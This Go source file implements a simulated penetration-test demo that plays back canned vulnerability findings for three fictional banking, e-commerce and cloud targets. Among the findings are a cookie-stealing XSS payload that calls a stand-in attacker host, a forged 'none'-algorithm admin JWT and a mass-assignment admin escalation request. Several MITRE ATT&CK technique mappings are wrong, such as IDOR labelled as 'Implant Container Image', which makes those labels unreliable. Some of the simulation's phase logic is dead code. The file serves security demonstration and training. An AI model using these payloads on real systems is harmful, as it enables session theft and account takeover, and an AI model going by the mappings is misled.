package demo

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/ares/engine/internal/logger"
)

type EventPusher interface {
	Push(scanID, evType, message string)
}

type DemoTarget struct {
	Name        string   `json:"name"`
	URL         string   `json:"url"`
	Description string   `json:"description"`
	TechStack   []string `json:"tech_stack"`
}

type DemoScenario struct {
	ID               string     `json:"id"`
	Name             string     `json:"name"`
	Description      string     `json:"description"`
	Target           DemoTarget `json:"target"`
	ExpectedFindings []string   `json:"expected_findings"`
	Difficulty       string     `json:"difficulty"`
}

type DemoFinding struct {
	ID              string  `json:"id"`
	Title           string  `json:"title"`
	Severity        string  `json:"severity"`
	Endpoint        string  `json:"endpoint"`
	Description     string  `json:"description"`
	Impact          string  `json:"impact"`
	Remediation     string  `json:"remediation"`
	CVSSScore       float64 `json:"cvss_score"`
	CVSSVector      string  `json:"cvss_vector"`
	EvidencePath    string  `json:"evidence_path"`
	ExtractionProof string  `json:"extraction_proof"`
	MITRETactic     string  `json:"mitre_tactic"`
	MITRETechnique  string  `json:"mitre_technique"`
	ScreenshotURL   string  `json:"screenshot_url"`
	Timestamp       string  `json:"timestamp"`
}

type DemoManager struct {
	mu          sync.Mutex
	active      bool
	scanID      string
	scenario    *DemoScenario
	dash        EventPusher
	findings    []DemoFinding
	phase       string
	phaseIdx    int
	totalPhases int
	stop        chan struct{}
	startedAt   time.Time
	done        bool
	apiKey      string
}

var Scenarios = []DemoScenario{
	{
		ID:          "demo-securebank",
		Name:        "SecureBank Web Application",
		Description: "Simulates a banking application vulnerable to SQL injection, stored XSS, and insecure direct object references",
		Target: DemoTarget{
			Name:        "SecureBank Online",
			URL:         "https://securebank.demo.ares",
			Description: "A full-featured online banking platform with account management, transfers, and admin panel",
			TechStack:   []string{"Java Spring", "PostgreSQL", "React", "Nginx", "Docker"},
		},
		ExpectedFindings: []string{"SQL Injection — /api/accounts", "Stored XSS — /profile/bio", "IDOR — /api/transactions/{id}"},
		Difficulty:       "Intermediate",
	},
	{
		ID:          "demo-shopapi",
		Name:        "ShopAPI E-Commerce",
		Description: "Simulates an e-commerce REST API with broken authentication, mass assignment, and rate limiting issues",
		Target: DemoTarget{
			Name:        "ShopAPI",
			URL:         "https://api.shop.demo.ares",
			Description: "A modern headless e-commerce API serving a multi-tenant storefront platform",
			TechStack:   []string{"Node.js", "Express", "MongoDB", "Redis", "AWS Lambda"},
		},
		ExpectedFindings: []string{"Broken Authentication — JWT", "Mass Assignment — /api/users", "Rate Limit Bypass — /auth/login"},
		Difficulty:       "Beginner",
	},
	{
		ID:          "demo-cloudcorp",
		Name:        "CloudCorp Infrastructure",
		Description: "Simulates a cloud-hosted application with SSRF, misconfigured S3 buckets, and exposed IAM credentials",
		Target: DemoTarget{
			Name:        "CloudCorp Portal",
			URL:         "https://portal.cloudcorp.demo.ares",
			Description: "A cloud management portal for provisioning and monitoring cloud infrastructure resources",
			TechStack:   []string{"Python Flask", "AWS", "Terraform", "Kubernetes", "PostgreSQL"},
		},
		ExpectedFindings: []string{"SSRF — /api/fetch-url", "S3 Bucket Misconfiguration", "Exposed IAM Credentials — /env"},
		Difficulty:       "Advanced",
	},
}

var scenarioFindings = map[string][]DemoFinding{
	"demo-securebank": {
		{
			Title:           "SQL Injection in Account Listing",
			Severity:        "Critical",
			Endpoint:        "/api/accounts",
			Description:     "The /api/accounts endpoint concatenates user-supplied account_id parameter directly into SQL queries. An attacker can extract arbitrary data from the PostgreSQL database using UNION-based SQL injection.",
			Impact:          "Full database compromise. An attacker can extract customer PII (names, SSNs, account numbers), bypass authentication, and potentially gain code execution via PostgreSQL COPY TO/FROM PROGRAM.",
			Remediation:     "1) Use parameterized queries with prepared statements 2) Implement strict input validation 3) Apply least-privilege database user 4) Deploy WAF rules for SQLi patterns 5) Conduct regular code audits",
			CVSSScore:       9.8,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			EvidencePath:    "/evidence/securebank/sqli_accounts_poc.txt",
			ExtractionProof: `{"extracted_records": 142, "tables": ["users", "accounts", "transactions"], "sample": {"id": 1, "email": "admin@securebank.demo", "role": "admin"}}`,
			MITRETactic:     "Initial Access",
			MITRETechnique:  "T1190 — Exploit Public-Facing Application",
			ScreenshotURL:   "/assets/demo/securebank_sqli.png",
		},
		{
			Title:           "Stored Cross-Site Scripting in Profile Bio",
			Severity:        "High",
			Endpoint:        "/profile/bio",
			Description:     "The user profile bio field does not sanitize HTML input. An attacker can store malicious JavaScript that executes in the browser of any user viewing the profile, including admin users.",
			Impact:          "Session hijacking, credential theft via keylogging, defacement, and admin account takeover. An attacker can exfiltrate admin session cookies and perform unauthorized actions.",
			Remediation:     "1) Implement Content Security Policy headers 2) Use output encoding (OWASP XSS Prevention Cheat Sheet) 3) Sanitize user input with a DOMPurify-style library 4) Add X-XSS-Protection header",
			CVSSScore:       7.2,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N",
			EvidencePath:    "/evidence/securebank/xss_profile_bio.html",
			ExtractionProof: `<script>fetch('https://attacker.demo/steal?cookie='+document.cookie)</script>`,
			MITRETactic:     "Persistence",
			MITRETechnique:  "T1505 — Server Software Component",
			ScreenshotURL:   "/assets/demo/securebank_xss.png",
		},
		{
			Title:           "Insecure Direct Object Reference in Transactions",
			Severity:        "High",
			Endpoint:        "/api/transactions/{id}",
			Description:     "The transaction detail endpoint uses sequential numeric IDs without authorization checks. An authenticated user can enumerate other users' transactions by incrementing the ID parameter.",
			Impact:          "Unauthorized access to financial records of all bank customers. An attacker can view transaction history, account balances, and personally identifiable financial information.",
			Remediation:     "1) Implement proper authorization checks on all object-level operations 2) Use non-guessable UUIDs instead of sequential IDs 3) Apply relationship-based access control 4) Audit all API endpoints for IDOR",
			CVSSScore:       6.5,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
			EvidencePath:    "/evidence/securebank/idor_transactions.txt",
			ExtractionProof: `{"accessed_user": "user_42", "transactions": [{"id": 1042, "amount": 15000.00, "to": "attorney@example.com"}]}`,
			MITRETactic:     "Credential Access",
			MITRETechnique:  "T1525 — Implant Container Image",
			ScreenshotURL:   "/assets/demo/securebank_idor.png",
		},
	},
	"demo-shopapi": {
		{
			Title:           "Broken JWT Authentication",
			Severity:        "Critical",
			Endpoint:        "/api/auth/verify",
			Description:     "The JWT verification implementation accepts tokens with 'none' algorithm and does not validate the signature properly. An attacker can forge arbitrary user tokens.",
			Impact:          "Complete account takeover. An attacker can impersonate any user including administrators, perform unauthorized purchases, access protected API endpoints, and manipulate order data.",
			Remediation:     "1) Explicitly reject 'none' algorithm tokens 2) Use a well-vetted JWT library with strict validation 3) Implement token blacklisting 4) Use short token expiry with refresh tokens",
			CVSSScore:       9.1,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
			EvidencePath:    "/evidence/shopapi/jwt_forge.py",
			ExtractionProof: `{"forged_token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."}`,
			MITRETactic:     "Privilege Escalation",
			MITRETechnique:  "T1068 — Exploitation for Privilege Escalation",
			ScreenshotURL:   "/assets/demo/shopapi_jwt.png",
		},
		{
			Title:           "Mass Assignment in User Registration",
			Severity:        "High",
			Endpoint:        "/api/users",
			Description:     "The user creation endpoint accepts all user model fields without filtering. An attacker can set arbitrary fields including role, is_admin, and account_balance during registration.",
			Impact:          "Privilege escalation and financial fraud. An attacker can register as an admin user, modify account balances, and access restricted administrative functionality.",
			Remediation:     "1) Use Data Transfer Objects (DTOs) to whitelist allowed fields 2) Never bind request bodies directly to database models 3) Implement separate admin user creation endpoints 4) Add field-level authorization checks",
			CVSSScore:       8.6,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
			EvidencePath:    "/evidence/shopapi/mass_assignment.json",
			ExtractionProof: `{"request": {"email": "hacker@evil.com", "password": "hack123", "role": "admin", "is_admin": true, "balance": 999999}}`,
			MITRETactic:     "Persistence",
			MITRETechnique:  "T1098 — Account Manipulation",
			ScreenshotURL:   "/assets/demo/shopapi_massign.png",
		},
		{
			Title:           "Authentication Rate Limiting Bypass",
			Severity:        "Medium",
			Endpoint:        "/api/auth/login",
			Description:     "The login rate limiter uses client IP address which can be bypassed by injecting X-Forwarded-For headers. Additionally, the limit resets on every failed attempt within the window.",
			Impact:          "Brute force attacks become feasible. An attacker can enumerate valid usernames and eventually crack passwords without triggering lockout mechanisms.",
			Remediation:     "1) Rate limit by both IP and user account simultaneously 2) Implement progressive delays 3) Add CAPTCHA after N failures 4) Monitor for brute force patterns 5) Use a proper rate limiting service like Redis-based sliding window",
			CVSSScore:       5.3,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
			EvidencePath:    "/evidence/shopapi/rate_limit_bypass.txt",
			ExtractionProof: `{"attempts": 1500, "elapsed": 12.4, "valid_users": ["admin", "user1", "support"]}`,
			MITRETactic:     "Credential Access",
			MITRETechnique:  "T1110 — Brute Force",
			ScreenshotURL:   "/assets/demo/shopapi_ratelimit.png",
		},
	},
	"demo-cloudcorp": {
		{
			Title:           "Server-Side Request Forgery via URL Fetch",
			Severity:        "Critical",
			Endpoint:        "/api/fetch-url",
			Description:     "The /api/fetch-url endpoint accepts a URL parameter and fetches it server-side without validation. An attacker can access internal AWS metadata endpoints and internal services.",
			Impact:          "AWS credentials compromise via IMDS endpoint, internal network scanning, and access to internal services (Redis, PostgreSQL). Full cloud account compromise potential.",
			Remediation:     "1) Implement strict URL allow-lists 2) Block private IP ranges and metadata endpoints 3) Use a URL parser to validate schemes and hosts 4) Apply network segmentation 5) Disable IMDSv1 and require IMDSv2",
			CVSSScore:       9.1,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N",
			EvidencePath:    "/evidence/cloudcorp/ssrf_metadata.txt",
			ExtractionProof: `{"iam_role": "CloudCorp-Production-Role", "access_key": "AKIA****EXAMPLE", "secret_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}`,
			MITRETactic:     "Discovery",
			MITRETechnique:  "T1614 — System Location Discovery",
			ScreenshotURL:   "/assets/demo/cloudcorp_ssrf.png",
		},
		{
			Title:           "S3 Bucket Misconfiguration",
			Severity:        "High",
			Endpoint:        "s3://cloudcorp-backups",
			Description:     "The S3 bucket 'cloudcorp-backups' allows public listing and read access. The bucket contains database backups, configuration files, and deployment scripts with embedded secrets.",
			Impact:          "Data breach of customer information, exposure of infrastructure secrets, and potential lateral movement into cloud environment using exposed credentials.",
			Remediation:     "1) Block all public access to S3 buckets 2) Use bucket policies with least privilege 3) Enable S3 Block Public Access at account level 4) Encrypt buckets with KMS 5) Regularly audit bucket permissions with AWS Config",
			CVSSScore:       7.5,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			EvidencePath:    "/evidence/cloudcorp/s3_exposure.txt",
			ExtractionProof: `{"bucket_contents": ["prod-db-backup-2026-05-01.sql.gz", "terraform.tfstate", "deploy.sh", ".env.production"], "total_objects": 247}`,
			MITRETactic:     "Collection",
			MITRETechnique:  "T1530 — Data from Cloud Storage Object",
			ScreenshotURL:   "/assets/demo/cloudcorp_s3.png",
		},
		{
			Title:           "Exposed Environment Variables Endpoint",
			Severity:        "High",
			Endpoint:        "/env",
			Description:     "A debug /env endpoint is exposed in the production deployment that dumps all environment variables including AWS IAM credentials, database passwords, and API keys.",
			Impact:          "Full cloud infrastructure compromise. Exposed credentials allow direct AWS API access, database connection, and third-party service API access.",
			Remediation:     "1) Remove debug endpoints from production builds 2) Use a secrets manager (AWS Secrets Manager / HashiCorp Vault) 3) Implement proper environment configuration management 4) Scan for exposed endpoints regularly",
			CVSSScore:       7.5,
			CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
			EvidencePath:    "/evidence/cloudcorp/env_exposure.txt",
			ExtractionProof: `{"AWS_ACCESS_KEY_ID": "AKIA***", "AWS_SECRET_ACCESS_KEY": "***", "DB_PASSWORD": "prod-p@ssw0rd!", "STRIPE_API_KEY": "sk_live_***"}`,
			MITRETactic:     "Credential Access",
			MITRETechnique:  "T1552 — Unsecured Credentials",
			ScreenshotURL:   "/assets/demo/cloudcorp_env.png",
		},
	},
}

func NewDemoManager(dash EventPusher) *DemoManager {
	return &DemoManager{
		dash:        dash,
		stop:        make(chan struct{}),
		totalPhases: 5,
	}
}

func (dm *DemoManager) SetAPIKey(key string) {
	dm.mu.Lock()
	defer dm.mu.Unlock()
	dm.apiKey = key
}

func (dm *DemoManager) ScenarioByID(id string) *DemoScenario {
	for _, s := range Scenarios {
		if s.ID == id {
			return &s
		}
	}
	return nil
}

func (dm *DemoManager) StartDemo(scenarioID string) (string, error) {
	dm.mu.Lock()
	if dm.active {
		dm.mu.Unlock()
		return "", fmt.Errorf("demo already active (scan: %s)", dm.scanID)
	}

	sc := dm.ScenarioByID(scenarioID)
	if sc == nil {
		dm.mu.Unlock()
		return "", fmt.Errorf("unknown scenario: %s", scenarioID)
	}

	scanID := "DEMO-" + generateShortID()
	dm.active = true
	dm.done = false
	dm.scanID = scanID
	dm.scenario = sc
	dm.findings = nil
	dm.phase = "pending"
	dm.phaseIdx = 0
	dm.startedAt = time.Now()
	dm.stop = make(chan struct{})
	dm.mu.Unlock()

	dash := dm.dash

	dash.Push(scanID, "DEMO_START", fmt.Sprintf("Demo started: %s — %s", sc.Name, sc.Target.URL))

	go dm.runSimulation(scanID, sc, dash)

	return scanID, nil
}

func (dm *DemoManager) runSimulation(scanID string, sc *DemoScenario, dash EventPusher) {
	phases := []struct {
		name  string
		msg   string
		find  bool
		delay time.Duration
	}{
		{"recon", "Reconnaissance: Scanning target network topology, open ports, and service fingerprinting...", false, 4},
		{"discovery", "Discovery: Enumerating endpoints, hidden directories, and technology stack...", false, 3},
		{"vulnscan", "Vulnerability Scan: Fuzzing parameters, injecting test payloads, analyzing responses...", true, 5},
		{"exploit", "Exploitation: Confirming vulnerabilities, extracting proof data, chaining attacks...", true, 4},
		{"report", "Report Generation: Compiling findings, scoring with CVSS, generating evidence...", false, 3},
	}

	allFindings := scenarioFindings[sc.ID]

	for i, phase := range phases {
		select {
		case <-dm.stop:
			dash.Push(scanID, "DEMO_STOP", "Demo stopped by user")
			dm.mu.Lock()
			dm.active = false
			dm.done = true
			dm.mu.Unlock()
			return
		default:
		}

		dm.mu.Lock()
		dm.phase = phase.name
		dm.phaseIdx = i
		dm.mu.Unlock()

		dash.Push(scanID, "DEMO_PHASE", fmt.Sprintf("[%s] %s", phase.name, phase.msg))

		time.Sleep(phase.delay * time.Second)

		if phase.find && len(allFindings) > 0 {
			startIdx := 0
			if i == 3 && len(allFindings) > 0 {
				startIdx = 0
			}
			endIdx := len(allFindings)
			if i == 2 {
				endIdx = len(allFindings)
			}
			if i == 3 && startIdx < len(allFindings) {
				endIdx = len(allFindings)
			}

			for fi := startIdx; fi < endIdx; fi++ {
				if fi >= len(allFindings) {
					break
				}
				f := allFindings[fi]
				now := time.Now().Format(time.RFC3339)
				f.ID = fmt.Sprintf("DEMO-%s-%d", generateShortID(), fi)
				f.Timestamp = now

				dm.mu.Lock()
				dm.findings = append(dm.findings, f)
				dm.mu.Unlock()

				dash.Push(scanID, "FINDING_ADD", fmt.Sprintf("[%s] %s — %s", f.Severity, f.Title, f.Endpoint))

				time.Sleep(800 * time.Millisecond)
			}
		}

		dash.Push(scanID, "DEMO_PHASE_DONE", fmt.Sprintf("Phase [%s] complete", phase.name))
	}

	dm.mu.Lock()
	dm.phase = "complete"
	dm.done = true
	findings := make([]DemoFinding, len(dm.findings))
	copy(findings, dm.findings)
	dm.mu.Unlock()

	dash.Push(scanID, "DEMO_COMPLETE", fmt.Sprintf("Demo complete! Found %d vulnerabilities in %s", len(findings), time.Since(dm.startedAt).Round(time.Second).String()))
}

func (dm *DemoManager) Stop() {
	dm.mu.Lock()
	defer dm.mu.Unlock()
	if dm.active {
		close(dm.stop)
		dm.active = false
		dm.done = true
	}
}

func (dm *DemoManager) Active() bool {
	dm.mu.Lock()
	defer dm.mu.Unlock()
	return dm.active
}

func (dm *DemoManager) Status() map[string]interface{} {
	dm.mu.Lock()
	defer dm.mu.Unlock()

	return map[string]interface{}{
		"active":       dm.active,
		"scan_id":      dm.scanID,
		"phase":        dm.phase,
		"phase_index":  dm.phaseIdx,
		"total_phases": dm.totalPhases,
		"findings":     dm.findings,
		"scenario":     dm.scenario,
		"elapsed":      time.Since(dm.startedAt).String(),
		"done":         dm.done,
	}
}

func (dm *DemoManager) authMiddleware(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		dm.mu.Lock()
		key := dm.apiKey
		dm.mu.Unlock()
		if key == "" {
			next(w, r)
			return
		}
		auth := r.Header.Get("Authorization")
		if auth == "" {
			auth = r.URL.Query().Get("api_key")
		}
		if auth != key {
			http.Error(w, "unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

func (dm *DemoManager) HandleScenarios(w http.ResponseWriter, r *http.Request) {
	dm.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(Scenarios)
	})(w, r)
}

func (dm *DemoManager) HandleStart(w http.ResponseWriter, r *http.Request) {
	dm.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var req struct {
			ScenarioID string `json:"scenario_id"`
		}
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "bad request", http.StatusBadRequest)
			return
		}

		scenarioID := strings.TrimSpace(req.ScenarioID)
		if scenarioID == "" {
			http.Error(w, "scenario_id is required", http.StatusBadRequest)
			return
		}
		if strings.ContainsAny(scenarioID, ":/\\") {
			http.Error(w, "invalid scenario_id: contains URL/path characters", http.StatusBadRequest)
			return
		}
		if _, err := url.Parse(scenarioID); err == nil && strings.Contains(scenarioID, "://") {
			http.Error(w, "invalid scenario_id: URL not allowed", http.StatusBadRequest)
			return
		}

		allowed := false
		for _, s := range Scenarios {
			if s.ID == scenarioID {
				allowed = true
				break
			}
		}
		if !allowed {
			http.Error(w, "unknown scenario", http.StatusNotFound)
			return
		}

		scanID, err := dm.StartDemo(req.ScenarioID)
		if err != nil {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusConflict)
			json.NewEncoder(w).Encode(map[string]string{"error": "scenario unavailable"})
			return
		}

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]interface{}{
			"scan_id": scanID,
			"status":  "started",
		})
	})(w, r)
}

func (dm *DemoManager) HandleStatus(w http.ResponseWriter, r *http.Request) {
	dm.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(dm.Status())
	})(w, r)
}

func (dm *DemoManager) HandleStop(w http.ResponseWriter, r *http.Request) {
	dm.authMiddleware(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		dm.Stop()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
	})(w, r)
}

func generateShortID() string {
	b := make([]byte, 4)
	if _, err := rand.Read(b); err != nil {
		logger.Error(fmt.Sprintf("crypto/rand failed: %v", err))
		return fmt.Sprintf("%08x", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

func notFoundHandler(w http.ResponseWriter, r *http.Request) {
	http.Error(w, "not found", http.StatusNotFound)
}
